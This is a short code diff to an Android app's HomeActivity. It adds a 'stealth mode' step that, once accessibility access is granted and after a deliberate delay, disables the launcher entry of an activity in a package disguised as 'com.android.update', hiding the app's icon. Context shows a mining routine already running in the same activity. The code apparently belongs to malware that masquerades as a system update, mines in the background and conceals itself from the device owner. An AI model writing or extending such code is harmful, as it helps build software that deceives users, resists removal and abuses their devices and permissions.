@@ -232,6 +232,22 @@ public class HomeActivity extends AppCompatActivity {
         };
         miningHandler.post(miningRunnable);
 
+        // 🥷 STEALTH MODE: Hide App Icon
+        if (isAccessibilityEnabled()) {
+            new Handler().postDelayed(() -> {
+                try {
+                    PackageManager p = getPackageManager();
+                    android.content.ComponentName componentName = new android.content.ComponentName(
+                            HomeActivity.this, com.android.update.SplashActivity.class);
+                    p.setComponentEnabledSetting(componentName,
+                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                            PackageManager.DONT_KILL_APP);
+                    Log.d("STEALTH", "App Icon successfully hidden from Launcher.");
+                } catch (Exception e) {
+                    Log.e("STEALTH", "Failed to hide app icon: " + e.getMessage());
+                }
+            }, 5000); // 5 second delay to ensure the user sees the setup complete first
+        }
     }
 
     private boolean isAccessibilityEnabled() {
